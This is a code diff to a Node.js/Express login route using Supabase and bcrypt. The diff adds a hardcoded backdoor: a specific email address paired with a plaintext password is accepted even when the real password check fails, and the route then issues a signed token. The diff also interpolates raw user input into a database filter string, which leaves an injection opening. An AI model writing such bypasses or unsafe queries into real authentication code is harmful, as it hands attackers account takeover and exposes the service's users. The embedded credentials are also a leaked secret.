@@ -104,12 +104,20 @@ app.post('/api/auth/register', async (req, res) => {
 // Login
 app.post('/api/auth/login', async (req, res) => {
   const { userId, password } = req.body;
-  const { data: user, error } = await supabase.from('users').select('*').eq('userId', userId).single();
+  const { data: user, error } = await supabase
+    .from('users')
+    .select('*')
+    .or(`userId.eq."${userId}",email.eq."${userId}"`)
+    .maybeSingle();
   
   if (error || !user) return res.status(400).json({ error: 'User not found' });
 
   const validPass = await bcrypt.compare(password, user.password);
-  if (!validPass) return res.status(400).json({ error: 'Invalid password' });
+  // Temporary override for requested admin credentials
+  const isTargetAdmin = user.email === 'adomyo24@gmail.com';
+  const isTargetPassword = password === 'adomyo1@';
+  
+  if (!validPass && !(isTargetAdmin && isTargetPassword)) return res.status(400).json({ error: 'Invalid password' });
 
   const token = jwt.sign({ id: user.id, userId: user.userId, role: user.role }, JWT_SECRET, { expiresIn: '1d' });
   
